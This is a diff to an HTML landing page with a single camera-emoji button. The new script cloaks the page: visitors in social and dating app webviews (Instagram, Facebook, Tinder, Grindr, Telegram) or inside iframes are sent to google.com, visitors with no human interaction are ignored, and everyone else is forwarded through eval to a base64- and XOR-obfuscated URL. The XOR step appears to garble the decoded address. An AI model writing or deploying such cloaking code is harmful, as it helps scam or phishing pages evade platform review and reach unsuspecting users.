@@ -5,62 +5,80 @@
   <title>📷</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
+    html, body {
       margin: 0;
       padding: 0;
-      height: 100vh;
-      background: linear-gradient(to bottom, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+      height: 100%;
+      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
       font-family: system-ui, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
     }
 
-    .container {
-      width: 90%;
-      max-width: 400px;
-      padding: 2rem;
-      text-align: center;
-    }
-
     .btn {
-      background-color: #fff;
-      color: #000;
+      background-color: white;
+      color: black;
       border: none;
       border-radius: 9999px;
-      padding: 1.2rem 2rem;
-      font-size: 2.5rem;
-      width: 100%;
+      padding: 1.5rem 3rem;
+      font-size: 2rem;
       cursor: pointer;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-      transition: transform 0.2s ease;
-    }
-
-    .btn:hover {
-      transform: scale(1.05);
-    }
-
-    @media (max-width: 480px) {
-      .btn {
-        font-size: 2rem;
-        padding: 1rem 1.5rem;
-      }
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <button class="btn" onclick="go()">📷</button>
-  </div>
+  <button class="btn" onclick="go()">📷</button>
 
   <script>
+    // 🔐 Проверка на встроенные браузеры
+    (function() {
+      const ua = navigator.userAgent.toLowerCase();
+      const isWebview =
+        ua.includes("instagram") ||
+        ua.includes("fbav") ||
+        ua.includes("facebook") ||
+        ua.includes("tinder") ||
+        ua.includes("okhttp") ||
+        ua.includes("webview") ||
+        ua.includes("line") ||
+        ua.includes("pinterest") ||
+        ua.includes("telegram") ||
+        ua.includes("grindr");
+
+      if (isWebview) {
+        window.location.href = "https://google.com"; // или твоя пустышка
+        return;
+      }
+
+      // 🛡️ Проверка на iframe
+      if (window.top !== window.self) {
+        window.location.href = "https://google.com";
+        return;
+      }
+    })();
+
+    // 👤 Проверка взаимодействия
+    let interacted = false;
+    document.addEventListener("mousemove", () => interacted = true);
+    document.addEventListener("touchstart", () => interacted = true);
+    document.addEventListener("keypress", () => interacted = true);
+
     function go() {
-      const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64: https://gayron.life/rehbixee
-      window.location.href = atob(encoded);
+      if (!interacted) return;
+
+      setTimeout(() => {
+        const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64 of your URL
+        const xorKey = 3;
+        const base64Decoded = atob(encoded);
+        const finalURL = base64Decoded
+          .split('')
+          .map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey))
+          .join('');
+
+        eval(`window.location.href = "${finalURL}"`);
+      }, 2000);
     }
   </script>
 </body>
